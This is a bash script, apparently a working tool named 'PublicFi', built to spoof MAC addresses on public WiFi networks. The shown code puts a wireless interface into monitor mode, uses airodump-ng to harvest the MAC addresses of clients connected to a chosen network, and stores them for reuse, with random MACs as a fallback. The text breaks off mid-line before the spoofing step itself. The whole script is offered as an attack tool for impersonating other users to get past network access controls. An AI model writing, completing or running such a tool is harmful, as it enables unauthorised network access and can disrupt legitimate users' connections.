#!/bin/bash

# PublicFi - Advanced MAC spoofing tool for public WiFi networks
# Usage: sudo ./publicfi.sh [interface] [essid]

VERSION="1.0.0"

# Default values
interface="${1:-wlan0}"
essid="${2:-PubFi}"
mac_list="/tmp/publicfi_macs.txt"
log_file="/tmp/publicfi_log.txt"
timeout_seconds=15
retry_attempts=3
ping_host="8.8.8.8"
ping_count=3
stored_macs_file="$HOME/.publicfi_macs"

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to log messages
log() {
    local message="$1"
    local level="${2:-INFO}"
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    echo -e "[$timestamp] [$level] $message" | tee -a "$log_file"
}

# Function to log errors with red color
error() {
    log "$1" "ERROR" >&2
    echo -e "${RED}ERROR: $1${NC}" >&2
}

# Function to log success with green color
success() {
    log "$1" "SUCCESS"
    echo -e "${GREEN}SUCCESS: $1${NC}"
}

# Function to log info with blue color
info() {
    log "$1" "INFO"
    echo -e "${BLUE}INFO: $1${NC}"
}

# Function to log warnings with yellow color
warning() {
    log "$1" "WARNING"
    echo -e "${YELLOW}WARNING: $1${NC}"
}

# Check for root privileges
check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        error "This script requires root privileges. Please run with sudo."
        exit 1
    fi
}

# Check if required tools are installed
check_dependencies() {
    local missing_deps=()
    
    for cmd in ip iw nmcli airodump-ng grep awk sed ping; do
        if ! command -v "$cmd" &>/dev/null; then
            missing_deps+=("$cmd")
        fi
    done
    
    if [ ${#missing_deps[@]} -gt 0 ]; then
        error "Missing dependencies: ${missing_deps[*]}"
        
        case ${missing_deps[*]} in
            *airodump-ng*)
                echo "To install aircrack-ng suite (includes airodump-ng): sudo apt install aircrack-ng"
                ;;
            *nmcli*)
                echo "To install NetworkManager: sudo apt install network-manager"
                ;;
        esac
        
        exit 1
    fi
    
    info "All required dependencies are installed"
}

# Check if interface exists and is wireless
check_interface() {
    # Check if interface exists
    if ! ip link show "$interface" &>/dev/null; then
        error "Interface '$interface' does not exist"
        
        # Suggest available interfaces
        echo "Available interfaces:"
        ip -o link show | awk -F': ' '{print $2}'
        exit 1
    fi
    
    # Check if interface is wireless
    if ! iw dev "$interface" info &>/dev/null; then
        error "Interface '$interface' is not a wireless device"
        
        # Find available wireless interfaces
        echo "Available wireless interfaces:"
        iw dev | grep Interface | awk '{print $2}'
        exit 1
    fi
    
    info "Using wireless interface: $interface"
}

# Check if SSID is available
check_ssid() {
    local retry=0
    local max_retry=3
    local found=0
    
    while [ $retry -lt $max_retry ] && [ $found -eq 0 ]; do
        info "Scanning for SSID '$essid' (Attempt $(($retry+1))/$max_retry)..."
        
        # Ensure interface is in managed mode for scanning
        sudo ip link set "$interface" down 2>/dev/null
        sudo iw "$interface" set type managed 2>/dev/null
        sudo ip link set "$interface" up 2>/dev/null
        nmcli dev set "$interface" managed yes 2>/dev/null
        
        # Scan for networks
        nmcli dev wifi rescan 2>/dev/null
        sleep 2
        
        if nmcli -t -f SSID dev wifi | grep -q "^$essid$"; then
            success "Found SSID: $essid"
            found=1
        else
            retry=$((retry+1))
            if [ $retry -lt $max_retry ]; then
                warning "SSID '$essid' not found in scan results. Retrying..."
                sleep 2
            fi
        fi
    done
    
    if [ $found -eq 0 ]; then
        error "SSID '$essid' not found after $max_retry attempts."
        echo "Available networks:"
        nmcli -t -f SSID dev wifi | sort | uniq | grep -v '^$'
        
        read -p "Would you like to specify a different SSID? (y/n): " change_ssid
        if [[ "$change_ssid" =~ ^[Yy]$ ]]; then
            read -p "Enter new SSID: " new_essid
            if [ -n "$new_essid" ]; then
                essid="$new_essid"
                info "SSID changed to: $essid"
                check_ssid # Recursive check with new SSID
            else
                error "No SSID provided. Exiting."
                exit 1
            fi
        else
            error "Cannot continue without a valid SSID. Exiting."
            exit 1
        fi
    fi
}

# Function to switch to monitor mode
monitor_mode() {
    info "Putting $interface into monitor mode..."
    
    # Try to disable NetworkManager control
    if ! nmcli dev set "$interface" managed no; then
        warning "Failed to set interface as unmanaged in NetworkManager"
    fi
    
    # Set interface down
    if ! sudo ip link set "$interface" down; then
        error "Failed to bring down interface $interface"
        return 1
    fi
    
    # Try to set monitor mode
    if ! sudo iw "$interface" set type monitor; then
        error "Failed to set interface $interface to monitor mode"
        
        # Check if monitor mode is supported
        if ! iw list | grep -q "Supported interface modes:" -A 10 | grep -q "* monitor"; then
            error "Monitor mode is not supported on this device"
            
            # Try alternative method with iwconfig if available
            if command -v iwconfig &>/dev/null; then
                warning "Trying alternative method with iwconfig..."
                if ! sudo iwconfig "$interface" mode monitor; then
                    error "Failed to set monitor mode with iwconfig"
                    return 1
                fi
            else
                return 1
            fi
        else
            return 1
        fi
    fi
    
    # Bring interface up
    if ! sudo ip link set "$interface" up; then
        error "Failed to bring up interface $interface"
        return 1
    fi
    
    # Verify mode
    local current_mode
    current_mode=$(iw dev "$interface" info 2>/dev/null | grep "type" | awk '{print $2}')
    
    if [ "$current_mode" != "monitor" ]; then
        error "Failed to verify monitor mode, current mode: $current_mode"
        return 1
    fi
    
    success "Interface $interface is now in monitor mode"
    return 0
}

# Function to scan for connected clients
scan_for_clients() {
    info "Scanning for clients connected to '$essid'..."
    
    # Clean up any previous scan files
    rm -f "/tmp/scan-01.csv" "$mac_list" 2>/dev/null
    
    # Start airodump-ng and capture for specified time
    sudo timeout "$timeout_seconds" airodump-ng "$interface" --essid "$essid" -a --output-format csv -w "/tmp/scan" >/dev/null 2>&1
    
    # Check if scan file exists and has content
    if [ ! -f "/tmp/scan-01.csv" ]; then
        error "Scan failed: No output file created"
        return 1
    fi
    
    # Extract client MAC addresses
    grep -v "Station MAC" "/tmp/scan-01.csv" 2>/dev/null | grep -v "^$" | cut -d, -f1 | tr -d ' ' > "$mac_list"
    
    # Count MACs found
    local mac_count=$(wc -l < "$mac_list" 2>/dev/null || echo 0)
    
    if [ "$mac_count" -eq 0 ]; then
        warning "No client MAC addresses found for '$essid'"
        
        # Check if any networks were detected
        if grep -q "BSSID" "/tmp/scan-01.csv" 2>/dev/null; then
            info "Network '$essid' was detected but no clients are connected"
            
            # Try to use stored MACs if available
            if [ -f "$stored_macs_file" ] && [ -s "$stored_macs_file" ]; then
                info "Found $(wc -l < "$stored_macs_file") stored MAC addresses"
                read -p "Would you like to try stored MACs? (y/n): " use_stored
                
                if [[ "$use_stored" =~ ^[Yy]$ ]]; then
                    cp "$stored_macs_file" "$mac_list"
                    success "Using $(wc -l < "$mac_list") stored MAC addresses"
                    return 0
                fi
            fi
            
            # Generate random MACs if needed
            read -p "Would you like to try with random MAC addresses? (y/n): " use_random
            if [[ "$use_random" =~ ^[Yy]$ ]]; then
                for i in {1..5}; do
                    openssl rand -hex
